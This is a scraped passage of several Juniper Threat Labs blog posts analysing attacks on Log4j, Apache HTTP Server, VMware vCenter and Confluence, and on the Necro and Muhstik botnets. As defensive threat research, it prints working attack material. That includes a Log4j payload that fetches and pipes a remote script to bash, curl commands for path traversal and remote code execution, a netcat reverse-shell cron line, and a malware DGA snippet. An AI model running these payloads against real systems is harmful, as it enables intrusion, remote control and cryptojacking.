C70e6f8edfca4be3ca0dc2cfac8fddd14804b7e1e3c496214d09c6798b4620c5  s.cmd 3ba2c4ae64be8d03747dffd5e4dc98730a54fdbb4aad50516428dc2507fdbfcf  lh.sh 9691061f778674bb4e28fb6a2d88a2fe72711ae71f3d2f4137654e1b5e91c9d2   py 6e25ad03103a1a972b78c642bac09060fa79c460011dc5748cbb433cc459938b  kinsing 68cc0ae1ca1e26d5f1dba19d065291ae6c5c69c9f37b9f384245d6fa070f1d69  kinsing 8ad160ddb9d617cf61ff0a7af0fa6d12ae26cf85a5d6e551c617f6c6bb770299 Exploit.class 9691061f778674bb4e28fb6a2d88a2fe72711ae71f3d2f4137654e1b5e91c9d2  mirai 70ffac4b8f2cf00a6876b3aa622c0efa87b53b681791302eea27692dd81f273d  ExecTemplateJDK8.class 85e88e7bdd4657422a121146600c71250d68b44a82b9677856ffda9dbec07d98  log4tst.exe f42915a2c76a29edd58fc2e1f7fde4c15d369e141d384064203ac57d53c41d5e  aa0 7ef631659c6f66719a18330ca3a79e89a9297681087659b8aa903c23c9e98be2  lz_coinminer e7c5b3de93a3184dc99c98c7f45e6ff5f6881b15d4a56c144e2e53e96dcc0e82  coinminer Monero Wallet 46QBumovWy4dLJ4R8wq8JwhHKWMhCaDyNDEzvxHFmAHn92EyKrttq6LfV6if5UYDAyCzh3egWXMhnfJJrEhWkMzqTPzGzsE"
            }
        },
        {
            "https://blogs.juniper.net/en-us/threat-research/log4j-vulnerability-attackers-shift-focus-from-ldap-to-rmi": {
                "metadata": {
                    "dateAccessed": "2022-11-16",
                    "dateCreated": "2021-12-16",
                    "source": "blogs.juniper.net"
                },
                "text": "In a previous post , we discussed the Log4j vulnerability CVE-2021-44228 and how the exploit works when the attacker uses a Lightweight Directory Access Protocol (LDAP) service to exploit the vulnerability. Most of the initial attacks observed by Juniper Threat Labs were using the LDAP JNDI vector to inject code in the victim’s server. Since then, we’ve begun to see some threat actors shift towards using the Remote Method Invocation (RMI) API. In this post, we will describe one such attack and will discuss in detail how the attack vector leads to RCE (Remote Code Execution). RMI is a mechanism that allows an object residing in one Java Virtual Machine (JVM) to access or invoke an object running on another JVM. To facilitate this interaction, the local JVM may require Java bytecode related to the remote object. This code is downloaded from a specified remote URL and loaded into the local JVM. RMI operations are subject to additional checks and constraints by a Java security manager . However, as discussed in a 2016 Black Hat presentation , some JVM versions do not apply the same restrictions and policies to JNDI. In the present attack, the caller is running a vulnerable version of Log4j and the attacker’s server is running RMI. Below is a diagram showing how the attack unfolds. From here, we will describe each step in detail. Figure 1. Log4j RMI attack overview As in many other Log4j attacks, an exploit string is inserted into the request’s User-Agent field, where it will be processed by Log4j. This time, however, the exploit string references an RMI service rather than an LDAP service. Figure 2. HTTP POST request with Log4j exploit. As seen in this packet capture, Log4j evaluates the contents of the ${…} string and generates a call to the attacker-controlled RMI service, which returns Java code that will be executed on the targeted machine: Figure 3. Packet capture of Java code returned by the malicious RMI service In this attack, the injected code is: .getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('bash -c $@|bash . wget -qO- http://192 [ . ] 99.152.200/ ')\") This code invokes a bash shell command via the JavaScript scripting engine, using the construction “$@|bash” to execute the downloaded script. During execution of this command, the bash shell will pipe the attacker’s commands to another bash process: “wget -qO- url | bash”, which downloads and executes a shell script on the target machine. This shell script begins with comments taunting security researchers: Figure 5. Shell script downloaded and executed by the attacker This obfuscated script downloads a randomly named file of the form n .png, where n is a number between 0 and 7. Despite the purported file extension, this is actually a Monero cryptominer binary compiled for x84_64 Linux targets. The full script also adds persistence via the cron subsystem. A different attack, also detected by Juniper Threat Labs, tries both RMI and LDAP services in the same HTTP POST request in hopes that at least one will work. The LDAP injection string is sent as part of the POST command body. An exploit string in the POST body which is unlikely to succeed given most applications do not log the post body, which can be binary or very large, but by tagging the string as “username” in the JSON body, the attackers hope to exploit applications that will treat this request as a login attempt and log the failure. Figure 4. Another HTTP POST request with Log4j/RMI attack Juniper Threat Labs continues to monitor attacks related to the Log4j vulnerability and add mitigations and protections across the suite of Juniper Networks security products. IDP signatures are being continuously updated based on variations, like the ones produced by this obfuscator tool on GitHub at: https://github.com/woodpecker-appstore/log4j-payload-generator . IOCs: 7e81fc39bcc8e92a4f0c1296d38df6a10353bbe479e11e2a99a256f670aae392 c56860f50a23082849b6f06fb769f02d2a90753aa8e9397015d8df991c961644 07a3ba85d77fa2337b86266c9a615ec696b0e5c8986edccc61fa9ba6436a3639 429aeec0165384dd061456ce49fa0039229f7c464edffd62aabd6d1fbdf068f3 Attackers IPs: 82[.]102.25.253 185[.]189.160.200 144[.]48.38.174 203[.]27.106.166 Monero pools: 192[.]99.152.200 212[.]47.237.67 [2001[:]bc8:608:e01::1] [2607[:]5300:201:3100::6944]"
            }
        },
        {
            "https://blogs.juniper.net/en-us/security/apache-log4j-vulnerability-cve-2021-44228-raises-widespread-concerns": {
                "metadata": {
                    "dateAccessed": "2022-11-16",
                    "dateCreated": "2021-12-12",
                    "source": "blogs.juniper.net"
                },
                "text": "Log4j is a popular logging library used in Java by a large number of applications online. To enhance its functionality from basic log formatting, Log4j added the ability to perform lookups: map lookups, system properties lookups as well as JNDI (Java Naming and Directory Interface) lookups. Log4j uses the JNDI API to obtain naming and directory services from several available service providers: LDAP (Lightweight Directory Access Protocol), COS (Common Object Services), Java RMI registry (Remote Method Invocation), DNS (Domain Name Service), etc. Description of the CVE-2021-44228 vulnerability Fig 1: Typical CVE-2021-44228 Exploitation Attack Pattern Log4j versions 2.0 through 2.14.1 have been found to be vulnerable to a Remote Code Execution vulnerability due to the fact JNDI does not protect against attacker-controlled directory service providers. Typically, a JDNI lookup would look like this: ${jndi:logging/context-name} Which allows to retrieve variables to be included in the log. But with carefully crafted data to be logged, JNDI will attempt to retrieve the variable with whatever service is presented in the log entry, for example: ${jndi:ldap://myserver.com/payload1} This log format will make JNDI retrieve the contents of payload1 from myserver.com. This can obviously be abused to provide malicious content to compromise the logging server. But how does the attacker get this string over to Log4j in the first place? The attacker has to know what is being logged by the application listening over the attacked port. For example, if the attack is on port 80 over http and the listener is a web server, the attacker knows the User-Agent string is usually logged by the server. Therefore, they would set the User-Agent string in their http request to ${jndi:ldap://myserver.com/payload1}. This is enough to trigger the vulnerability. This is just an example. Web servers log many headers, therefore one has to be careful not to focus on just User-Agent. Referrer is another header that is typically logged as well as GET, X-Remote-IP, X-Forwarded-For, etc. There are dozens of headers that are typically logged. We provide below a list of headers that we have already seen used in exploit attempts in the wild. For this attack to be complete, the attacker needs to host an “LDAP” server (which doesn’t have to be a real LDAP server at all) that will respond with the second stage payload of the attack. The response to the JNDI request will be used to build the location of the object at: http://myserver.com/payload2.class At this point, Log4j will fetch and run payload2.class in the server’s process, therefore allowing the attacker to execute this arbitrary code with the privileges of the web server’s process. Fig 2: pcap showing JTL reproduction of the attack using LDAP as an attack vector. The same approach can be used to trigger an RCE using RMI, since the attacker would reference rmi://myserver.com/payload, which is a class that will be loaded and executed by Log4j. It is unclear at this point whether a DNS service would also lead to RCE. Attacks in the wild Fig 3: Log4j requests Juniper Threat Labs has seen over the past 3 days. Juniper Threat Labs has been seeing some amount of scanning looking for vulnerable servers. A common method used by attackers is inserting the malicious request in the User-Agent header as most web servers will log this field to identify the browsers connecting to them. But we have also seen attacks where the malicious requests are injected in different headers such as the ones below: User-Agent: Authorization: CF-Connecting_IP: Client-IP: Contact: Cookie: Forwarded-For-Ip: Forwarded-For: Forwarded: From: Originating-IP: Proxy-Client-IP: Referer: True-Client-IP: X-Api-Version: X-Client-IP: X-Client-Ip: X-Forwarded-For: X-Host: X-Originating-Ip: X-Real-IP: X-Remote-Addr: X-Remote-Ip: X-Wap-Profile: In addition to the straightforward attacks, we have also seen some connections that attempt to obfuscate the requests such as using {lower: } or {upper:} in the request: Or using an HTTP post command and burying the malicious request in the POST body: This POST form would probably not succeed at exploiting this Log4j vulnerability in most situations because POST body is usually not logged. Given the port number used (8983), this seems to be targeting Apache SOLR enterprise search platform, which does not log POST bodies. Resolution Apache has released Log4j version 2.15 which contains a fix for this CVE. It is recommended to immediately upgrade to this version. Mitigation If you cannot upgrade to the fixed version of Log4j, you can mitigate this vulnerability as follows: For versions 2.0 and before 2.10, Apache recommends removing the Jndi Lookup class from the classpath by running zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class For versions 2.10 and above, set the system property formatMsgNoLookups to true or set the environment variable LOG4J_FORMAT_MSG_NO_LOOKUPS to true . If you cannot do any of the above, you can block all outbound LDAP or RMI connections using Application Identity filters. Juniper SRX NG Firewall provides AppID signatures for both protocols. Juniper Cloud Workload Protection customers already have native detection for this attack on protected applications and can block it. In the example below, you can see that Juniper’s CWP is detecting the LDAP remote access request as suspicious because it was initiated from content that was provided to the application via data input. Juniper SRX Next Gen Firewall customers can block these attacks with the IDP sig pack #3444 (Enhanced in #3445), but there is always a chance of variations that are not handled by existing signatures. Juniper Threat Labs is keeping an eye on all the variations that show up and will immediately spin up enhanced signatures when needed. Attack Variations Seen in the Wild A number of these attacks are probes by security researchers, but unfortunately we have to consider them as potentially malicious until proven otherwise. Threat actors also mimic threat researchers in hopes of hiding in the grey noise. Attack 1 Attack 2 Attack 3 Attack 4 This attack installs a linux Cryptominer e7c5b3de93a3184dc99c98c7f45e6ff5f6881b15d4a56c144e2e53e96dcc0e82 Attack 5 Attack 6 Attack 7 Indicators of Compromise 163[.]172[.]157[.]143:1389 185[.]250[.]148[.]157:1389 32fce0c1f193[.]bingsearchlib[.]com:39356 45[.]130[.]229[.]168:1389 45[.]155[.]205[.]233:12344 45[.]83[.]193[.]150:1389 92[.]242[.]40[.]21:5557 176[.]32[.]33[.]14 c6pa7pkpu896ceftu3j0cg3kemayys8b1[.]interactsh[.]com remoteflipside[.]com:80"
            }
        },
        {
            "https://blogs.juniper.net/en-us/threat-research/apache-http-server-cve-2021-42013-and-cve-2021-41773-exploited": {
                "metadata": {
                    "dateAccessed": "2022-11-16",
                    "dateCreated": "2021-10-22",
                    "source": "blogs.juniper.net"
                },
                "text": "Juniper Threat Labs has been seeing on-going attacks targeting Apache http servers. On October 4, the Apache Software Foundation disclosed CVE-2021-41773 , a path traversal 0- day vulnerability with reports of it being exploited in-the wild. Within one day, several proofs-of-concept to exploit the vulnerability surfaced online, that also included an unauthenticated remote code execution. Along with these developments, we started seeing active exploitation of this vulnerability in our telemetry beginning on October 6 . On October 7, CVE-2021-42013 published as patch released by Apache for CVE-2021-41773, was bypassed and several proofs-of-concept to exploit it surfaced online. Juniper Threat Labs is still seeing exploitation activity coming from multiple sources. Most of the exploitations are targeted toward two specific paths : /etc/passwd and /bin/sh . Below are a few examples of common requests captured in our telemetry. CVE-2021-41773 Attacks CVE-2021-42013 Attacks Let’s examine how these vulnerabilities can be exploited . Vulnerability Details CVE-2021-41773 is a directory traversal vulnerability that was introduced as a result of a recent change to path normalization designed to improve performance in the URL validation in Apache http server 2.4.49. It was found that if files outside the directories were not protected by the default configuration, “ require all denied”, the URL validation could be bypassed by the encoding character ‘.’. It was also verified that the vulnerability could be used for remote code execution if mod_cgi is enabled. PoCs that surfaced online used multiple variants to perform evasion for path traversal: /.%2e/.%2e/.%2e/ /.%2e%2f.%2e%2f that decodes to: /../../ /.%2e/%2e%2e/ that decodes to: /../../ On October 7 , CVE-2021-42013 was reported. It was observed that the patch rolled out for CVE-2021-41773 in Apache http server 2.4.50 was insufficient. The attackers could map the URLs to files outside the directories that can be configured by alias-like directives. If these files and directories are not protected by the default configuration “ require all denied” , it could lead to code execution. Inside Alias.conf Apache http server version 2.4.51 was released to mitigate these flaws. These vulnerabilities affect only Apache web servers running on version 2.4.49 and 2.4.50. Older versions are unaffected by this vulnerability. Exploitation Juniper Threat Labs, set up Apache http server 2.4.49 to simulate the attack scenario. Below is the vulnerable configuration: Vulnerable: <Directory /> Require all granted </Directory> NOT vulnerable (** DEFAULT **) : <Directory /> Require all denied </Directory> Vulnerable config in httpd.conf We can check the directory traversal with this one-liner curl command: curl -v –path-as-is http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd Contents of /etc/passwd retrieved Payloads can be modified to view other files also. GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/os-release This issue was fixed in Apache http server version 2.4.50 but was again exploited using double encoding technique. Contents of /etc/passwd retrieved via double encoding Path Traversal to Remote Code Execution (RCE) A remote unauthenticated user can create a specially crafted request with malicious code embedded in it that can lead to directory traversal and remote code execution. To achieve RCE, there are some pre-requisites. RCE is possible on the server only if mod_cgi is enabled. Mod_cgi is disabled in the default Apache http server configuration. Target binary should have executable permissions for /bin/sh. Below is the vulnerable configuration of httpd.conf: mod_cgi module enabled in httpd.conf We can check the response with a one-liner curl command: curl ‘http://<Target>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh’ -d ‘A=|echo;id’ -vv Testing remote code execution curl ‘http://<Target>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh’ –data ‘echo Content-Type: text/plain; echo; id’ Testing remote code execution with double encoding By conducting a simple search on Shodan, results show s that there are over 112,000 Apache servers across the globe running on Apache http server version 2.4.49 and almost 13,000 with version 2.4.50. There might be other vulnerable web servers configured that do not display version information. Shodan results for Apache Http Server 2.4.49 Image Source: Shodan Shodan results for Apache Http Server 2.4.50 Image Source: Shodan Remediation and Conclusion: Juniper Networks’ SRX Series Next-Generation Firewall (NGFW) customers with an IDP license are protected against this vulnerability by the signature: HTTP: APACHE: APACHE-PATH-TRAV. At the same time, all customers are recommended to update to the latest stable version of Apache http server as soon as possible, as per the advisory released by the Apache Foundation and to mitigate any risk associated with active exploitation of the flaw. Indicators of Compromise: Below are some of the attacker’s IOC’s: 45[.]146.164.110 139[.]59.126.50 128[.]90.166.247 128[.]90.161.152 128[.]90.166.31 157[.]119.200.185 163[.]172.173.238 89[.]248.173.143 145[.]220.25.28 134[.]122.112.12 145[.]220.25.6 161[.]35.86.181 143[.]198.136.88 155[.]138.142.87 167[.]99.133.28 185[.]111.51.118 185[.]225.17.102 89[.]46.62.130 137[.]184.69.137 140[.]213.59.194 142[.]93.35.77 143[.]198.62.76 157[.]230.212.97 157[.]230.216.201 157[.]245.153.240 157[.]245.51.232 178[.]128.164.5 46[.]101.59.235"
            }
        },
        {
            "https://blogs.juniper.net/en-us/threat-research/necro-python-botnet-goes-after-vulnerable-visualtools-dvr": {
                "metadata": {
                    "dateAccessed": "2022-11-16",
                    "dateCreated": "2021-10-11",
                    "source": "blogs.juniper.net"
                },
                "text": "In the last week of September 2021, Juniper Threat Labs detected a new activity from Necro Python (a.k.a N3Cr0m0rPh , Freakout, Python.IRCBot) that is actively exploiting some services, including a new exploit added to its arsenal. This new exploit targets Visual Tools DVR VX16 4.2.28.0 from visual-tools.com (no CVE number is assigned to this vulnerability). Successful exploitation will download the bot into the system and install a Monero miner. Necro was first discovered in January . The threat actor made a move in March and in May, adding new exploits to its arsenal. Necro bot is an interesting python bot that has many functions which include the following: Network Sniffer Spreading by exploits Spreading by brute-force Using Domain Generation Algorithm Installing a Windows rootkit Receiving and executing bot commands Participating in DDoS attacks Infecting HTML, JS, PHP files Installing Monero Miner The script can run in both Windows and Linux environments. The script has its own polymorphic engine to morph itself every execution which can bypass signature-based defenses. This works by reading every string in its code and encrypting it using a hardcoded key. Necro Python’s polymorphism, before and after Domain Generation Algorithm Necro uses DGA for both its CnC and download server. It selects from a list of dynamic DNS services as its domain, e.g., ddns.net and prefixes that with 10-19 random characters. E.g., ‘ 3ood3dfcqchro.ddns.net’ The domains are pseudo-randomly generated using a hardcoded seed, 0xFAFFDED00001, and a counter is added until 0xFD (253 in decimal) before the counter is reset to 0. The seed controls the domain to be generated.  In effect, it can generate up to 253 unique domains. This seed is different from the previous campaigns. For instance, the sample used in the March attack used a different seed, 0x7774DEAD. From this list of generated domains, it connects to them one by one to see which one is online. During our analysis, the following DGA domain was active: gtmpbeaxruxy[.]myftp.org import random counter=0 while 1: if counter>=0xFD: counter=0 counter+=1 random.seed(a=0xFAFFDED00001 + counter) DGA_DOMAIN=(''.join(random.choice('abcdefghijklmnopqoasadihcouvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randrange(10,19)))).lower()+\".\"+random.choice(['ddns.net', 'ddnsking.com', '3utilities.com', 'bounceme.net', 'freedynamicdns.net', 'freedynamicdns.org', 'gotdns.ch', 'hopto.org', 'myddns.me', 'myftp.biz', 'myftp.org', 'myvnc.com', 'onthewifi.com', 'redirectme.net', 'servebeer.com', 'serveblog.net', 'servecounterstrike.com', 'serveftp.com', 'servegame.com', 'servehalflife.com', 'servehttp.com', 'serveirc.com', 'serveminecraft.net', 'servemp3.com', 'servepics.com', 'servequake.com', 'sytes.net', 'viewdns.net', 'webhop.me', 'zapto.org']) Necro Python’s Domain Generation Algorithm Bot Commands Necro connects to the CnC server,  gtmpbeaxruxy.myftp.org, via IRC to receive commands which include the following: Command Function addport add port to the scanner delport remove port from scanner ports send to server the ports currently scanned injectcount send to server the number of files injected reinject launch function to inject to html, php, js, htm files scanner stop or launch scanner sniffer stop or launch sniffer scannetrange scan a range of IPs clearscan empty scanner DB revshell launch a reverse shell shell launch a process using subprocess.Popen() killknight kill itself execute executes a file killbyname kill process by name killbypid kill process by pid disable disable exploitation module enable enable exploitation module getip get current IP ram get information about the memory update update this bot visit visit a URL dlexe download and execute a file info get system information repack morph this bot logout logout from the server reconnect reconnect to the server udpflood UDP flood synflood SYN flood tcpflood TCP flood slowloris slowloris DDoS attack httpflood launch httpflood torflood launch DDoS using TOR SOCKS proxies loadamp initialize amplification attack reflect launch DNS reflection attack We have noted a few changes on this bot from the previous version. First, it removed the SMB scanner which was observed in the May 2021 attack. Second, it changed the url that it injects to script files on the compromised system. Previously, it used a hardcoded url, ‘ ublock-referer[.]dev/campaign.js ’ and injects this on the scripts and now it uses the DGA for its url, i.e., ‘DGA_DOMAIN/campaign.js’ . As noted in the previous reports, this bot will find HTML, PHP, JS and HTM files in the system and will inject a javascript code in every file. This is an attempt for that attacker to not only compromise the server but also clients connecting to it. Using a DGA domain to host the javascript makes it more resilient against defenses. Necro injects javascript code to html, htm, php and .js files found on the compromised server. It uses the DGA domain to host campaign.js Necro injects javascript code to html, htm, php and .js files found on the compromised server. It uses the DGA domain to host campaign.js We also noted a change in its TOR Socks proxies. When the bot receives the “ torflood ” command, it uses a set of TOR proxies for its DDOS attacks. New Tor Proxies [‘107.150.8.170:9051’, ‘95.217.251.233:1080’, ‘5.130.184.36:9999’, ‘83.234.161.187:9999’, ‘185.186.240.37:9119’, ‘5.61.53.57:9500’, ‘23.237.60.122:9051’, ‘185.82.217.167:9051’, ‘78.153.5.183:666’, ‘51.210.202.187:8425’, ‘85.159.44.163:9050’, ‘217.12.221.85:9051’, ‘130.61.153.38:9050’, ‘142.93.143.155:9010’, ‘8.209.253.198:9000’, ‘127.0.0.1:9050’] Visual Tools DVR Exploit As noted above, this bot added a new exploit to its arsenal. The exploit targets Visual Tools DVR VX16 4.2.28.0. A poc for this exploit was made available to the public in July, 2021. HTTP request made to attack Visual Tools DVR Aside from the bot, the payload will install a XMRig Monero miner with the following wallet. 45iHeQwQaunWXryL9YZ2egJxKvWBtWQUE4PKitu1VwYNUqkhHt6nyCTQb2dbvDRqDPXveNq94DG9uTndKcWLYNoG2uonhgH The scanner function of the bot scans for the following ports and if available, it launches its attack. TARGET_PORTS = [22, 80, 443, 8081, 8081, 7001] Juniper Threat Labs is still seeing this Necromorph exploiting the following vulnerabilities: CVE-2020-15568 – TerraMaster TOS before 4.1.29 CVE-2021-2900 – Genexis PLATINUM 4410 2.1 P4410-V2-1.28 CVE-2020-25494 – Xinuos (formerly SCO) Openserver v5 and v6 CVE-2020-28188 – TerraMaster TOS <= 4.2.06 CVE-2019-12725 – Zeroshell 3.9.0 Detection Exploits used in this attack are detected by Juniper’s NGFW SRX series. HTTP:CGI:BASH-CODE-INJECTION HTTP:CTS:TERRAMASTER-TOS-INJCTN HTTP:CTS:SCO-OPNSRVR-OS-INJ HTTP:CTS:GENEXIS-PLAT-RCE HTTP:CTS:ZEROSHELL-CGI-BIN-RCE Juniper Advanced Threat Prevention Cloud detects this bot as follows: Juniper Advanced Threat Prevention DNS Security also detects the DGA domain. Indicators of Compromise Domains: gtmpbeaxruxy[.]myftp.org URLs: http://gtmpbeaxruxy[.]myftp.org/setup.py http://gtmpbeaxruxy[.]myftp.org/setup http://gtmpbeaxruxy[.]myftp.org/xmrig http://gtmpbeaxruxy[.]myftp.org/xmrig1 Files: File Hash File Name Eb4a48a32af138e9444f87c4706e5c03d8dc313fabb7ea88c733ef1be9372899 setup E524bd7789b82df11891cc2c12af1ac0ea41dd0b946e1e04a4246cb36321f82f setup.py 0e537db39a7be5493750b7805e3a97da9e6dd78a0c7fca282a55a0241803d803 xmrig F72babf978d8b86a75e3b34f59d4fc6464dc988720d1574a781347896c2989c7 xmrig1 IP Addresses & ports: 107[.]150.8.170:9051 130[.]61.153.38:9050 142[.]93.143.155:9010 185[.]186.240.37:9119 185[.]82.217.167:9051 217[.]12.221.85:9051 23[.]237.60.122:9051 5[.]130.184.36:9999 5[.]61.53.57:9500 51[.]210.202.187:8425 78[.]153.5.183:666 8[.]209.253.198:9000 83[.]234.161.187:9999 85[.]159.44.163:9050 95[.]217.251.233:1080"
            }
        },
        {
            "https://blogs.juniper.net/en-us/threat-research/cve-2021-22005-vmware-vcenter-analytics-service-arbitrary-file-upload-vulnerability": {
                "metadata": {
                    "dateAccessed": "2022-11-16",
                    "dateCreated": "2021-10-05",
                    "source": "blogs.juniper.net"
                },
                "text": "VMware vCenter server is a centralised management utility used for managing multiple ESXi hosts, virtual machines and all their dependent components. An arbitrary file upload vulnerability has recently been discovered in the Analytics service of VMware vCen t er Server. V M ware has confirmed that this vulnerability is being actively exploited in the wild and CVE-2021-2205 has been assigned to it. More details about this vulnerability and various affected versions can be found at NVD . This blog examines how th is vulnera bility can be exploited in the unpatched vCenter Server 7.0. Vulnerability Details In our lab, we have locally setup vCenter 7.0 build 17920168 to test the attack scenario. The Customer Experience Improvement Program (CEIP) enables VMware to collect user usage statistics to improve their product and provide better user support. Some of these statistics are: Configuration Data Feature Usage Data Performance Data Product Log Data Use rs can opt in or out of CEIP from vCenter’s vSphere Client: VMware CEIP First, we determined how this telemetry data is collected and stored by VMware server. By taking a look at its various configurations, Juniper Threat Labs found analytics proxy.conf that defines several API calls specific to telemetry, as shown below: /analytics/telemetry/ph/api/hyper/send /analytics/telemetry/ph/api/level VMware analytics API configuration We also observe d that l ocal and 15080 is configured which should indicate hostname and port used for these APIs. We can see that a service called vmware -analytics is running over tcp port 15080 : vmware-analytics running over port 15080 The API in use is confirmed when we perform network capture on port 15080. POST request is sent to “ /analytics/telemetry/ph/api/hyper/send” . The query parameters “ _c” and “ _i” defines the filename for the log collected in JSON format wherein the filename is in following format: _c< value of parameter _c >_i< value of parameter _i >.json Result of tcpdump on port 15080 Looking at the logs, we can see that the file is created under folder “ / var/log/ vmware /analytics/pro d” , with the body of POST request appended to it: File created An arbitrary file upload vulnerability exists in vulnerable versions of VMware vCenter. Any user with web access to vCenter server can make use of the analytics endpoints to create arbitrary files at any directory of their choice. A remote unauthenticated user can create a specially crafted request with malicious code embedded in it that can lead to directory traversal and remote code execution. As an example, following curl request can create a file “ _c_itest.json” with content “ Example” in location “ /var/log/vmware/analytics/prod/” : curl -kv “https://<vCenter-Server-ip>/analytics/telemetry/ph/api/hyper/send?_c&_i=test” -d “Example” -H “Content-Type: application/json” S teps to recreate attack scenario Create a directory with a test file. Testing creation of directory and file File 1234.json created As we can see filename “ 1234.json” is created inside folder “ _ c_i” . Create a file in “/ tmp” to check for directory traversal Testing directory traversal Folder “ _ c_i” that was created in previous step is important to perform directory traversal , because the process will look for “_ c_i /.. /.. /.. /.. /.. /.. / tmp /” folder before writing the file “ test2.json” at destination location: File created in /tmp by directory traversal R emote C ode E xecution To achieve remote code execution and obtain a reverse shell, the following steps can be taken: On the victim’s server, create a cron job at “ /etc/cron.d/” using directory traversal. Provide the appropriate payload to attain reverse shell as body of request. On attacker machine, use nc to listen on port where we expect to get reverse shell from vCenter server. Let us first creat e a c ro n job file at “ / etc / cron.d /” to run as file owner and provide reverse shell. Here the reverse shell payload used is: ***** root nc –e /bin/bash 192.168.1.2 4444 This payload when written to file reverse .json at “ / etc / cron.d /” would run the nc –e /bin/bash 192.168.1.2 4444 command every minute. Creating cron job to obtain reverse shell cron job created at /etc/cron.d Once the file is created as expected, we would receive a reverse shell from vCenter server at port 4444 as seen below: Reverse shell obtained from vCenter server Remediation and Conclusion Juniper Networks’ SRX Series Next-Generation Firewall (NGFW) customers with an IDP license are protected against this vulnerability using the signature : HTTP:CTS:VCNTR-ANALYTCS-AFU The signature is released as part of export number 3422 and is part of recommended template. At the same time, all customers are recommended to update to latest stable version of vCenter as per the advisory released by VMware."
            }
        },
        {
            "https://blogs.juniper.net/en-us/threat-research/muhstik-botnet-targeting-confluence-servers-with-cve-2021-26084": {
                "metadata": {
                    "dateAccessed": "2022-11-16",
                    "dateCreated": "2021-09-09",
                    "source": "blogs.juniper.net"
                },
                "text": "Juniper Threat Labs is seeing an on-going attack targeting Confluence servers. On August 25, Atlassian, the company behind Confluence, disclosed the vulnerability CVE-2021-26084 . A few days after that , several proofs-of-concept to exploit this vulnerability surfaced online , which included an unauthenticated remote code execution (RCE). Along with that, we started seeing an active exploitation of this vulnerability in our telemetry which started on September 02. Most of the attacks are on port 8090, which is the default port for Confluence. CVE-2021-26084 attacks A dominant attack we have seen is an attack by the Muhstik botnet. CVE-2021-26084 attack from Muhstik bot The attack will download a file shell script, conf2 from 192.31.52.174 and will execute it with bash. The script will download the additional binaries dk86 and dk32 from 194.131.52.174 and save them in the temp directory. Additionally, it will download another script, ldm , from 18.235.127.50 . Inside conf2 bash script Dk86 is the 64-bit version of the Muhstik bot and Dk32 is the 32-bit version. Muhstik bot connects to an IRC server to receive commands which include the following: Download files Shell commands Flood attacks SSH brute force Functions inside Muhstik bot binary The ldm script is another bash script which has functions to download additional scripts and binaries via the following TOR links. https://bvprzqhoz7j2ltin[.]onion https://bvprzqhoz7j2ltin[.]tor2web.su/ https://bvprzqhoz7j2ltin[.]onion.ly/ https://bvprzqhoz7j2ltin[.]onion.ws/ Unfortunately, those links were offline during our investigation. ldm script dowloads “main” file The “ ldm ” script also has a function to execute remote commands on hosts that it can access via SSH. It enumerates the users in the host via the “ /home ” directory. It enumerates the ssh keys by looking into the files: /home/*/.ssh/config /root/.ssh/config “*.pem” file in each home or root folder id_rsa* in each home or root folder It also enumerates hosts by: Checking for “Hostname” in .ssh/config file Look into .bash_history file for commands with ssh or scp Look for IPs in .ssh/known/hosts It uses all this information to execute a command to download shell scripts, 3sh or 1sh from 34.221.40.237 . This script will download a version of the Muhstik bots, pty1 .. pty10 and the ldm script. Routine of “ldm” script to execute remote commands via SSH Contents of 1sh shell script to download Muhstik bot and ldm Censys has been tracking vulnerable Confluence servers. According to their report, there were 11,689 vulnerable Confluence servers on Sep 2, 2021. This number was reduced to 8,597 on Sep 4, 2021 which shows that people are trying to take action about this serious vulnerability. We recommend that customers upgrade and patch their confluence servers immediately. The malicious requests exploiting CVE-2021-26084 are detected by Juniper’s NGFW SRX series with IDP signatures HTTP:APACHE:STRUTS2-OGNL-INJ and HTTP:CTS:CONFLUENCE-DC-OGNL-INJ. Juniper Advanced Threat Prevention Cloud detects the Muhstik bot as follows. Indicators of Compromise 192[.]31.52.174 34[.]221.40.237 157[.]230.189.52 18[.]235.127.50 fe98548300025a46de1e06b94252af601a215b985dad31353596af3c1813efb0 *dk32 0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049 *dk86 39db1c54c3cc6ae73a09dd0a9e727873c84217e8f3f00e357785fba710f98129 *ldm a91dffe65048e39dfe1fd8da0b0dac11807718cdd5efedf4206a18af78779b0a *conf2 http://194[.]31.52.174/dk86 http://194[.]31.52.174/dk32 http://34[.]221.40.237/.x/pty1 http://34[.]221.40.237/.x/pty2 http://34[.]221.40.237/.x/pty10 http://34[.]221.40.237/.x/pty11 http://34[.]221.40.237/.x/pty3 http://34[.]221.40.237/.x/pty5 http://34[.]221.40.237/.x/pty4 http://34[.]221.40.237/.x/pty3 http://34[.]221.40.237/.x/pty3 http://157[.]230.189.52/wp-content/themes/twentynineteen/ldm http://18[.]235.127.50/ldm https://bvprzqhoz7j2ltin[.]onion https://bvprzqhoz7j2ltin[.]tor2web.su/ https://bvprzqhoz7j2ltin[.]onion.ly/ https://bvprzqhoz7j2ltin[.]onion.ws/"
            }
        },
        {
            "https://blogs.juniper.net/en-us/threat-research/asbit-an-emerging-remote-desktop-trojan": {
                "metadata": {
                    "dateAccessed": "2022-11-15",
                    "dateCreated": "2022-08-31",
                    "source": "blogs.juniper.net"
                },
